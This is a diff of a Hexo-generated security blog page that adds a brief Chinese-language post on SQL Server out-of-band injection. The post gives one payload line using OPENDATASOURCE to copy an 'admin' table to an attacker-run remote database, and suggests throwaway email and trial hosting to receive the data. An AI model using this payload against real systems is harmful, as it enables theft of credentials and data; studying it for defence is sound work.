@@ -145,6 +145,61 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sqlsever反弹注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SQLSever的反弹注入</p>
+<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p>
+<p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into opendatasource(&apos;sqloledb&apos;,&apos;server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名&apos;).数据库名.dbo.数据库中的表名 select * from admin--</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>select * from admin –</p>
+</blockquote>
+<p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p>
+<p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p>
+<p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p>
+<p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p>
+<p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="pages-一道经典的代码审计" class="article article-type-pages  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -533,7 +588,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 Crustsalt
+    		&copy; 2019 Crustsalt
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -616,11 +671,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf-misc</a>
+                <a href="javascript:void(0)" class="js-tag color3">杂言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">杂言</a>
+                <a href="javascript:void(0)" class="js-tag color4">ctf-misc</a>
               </li>
             
             <div class="clearfix"></div>
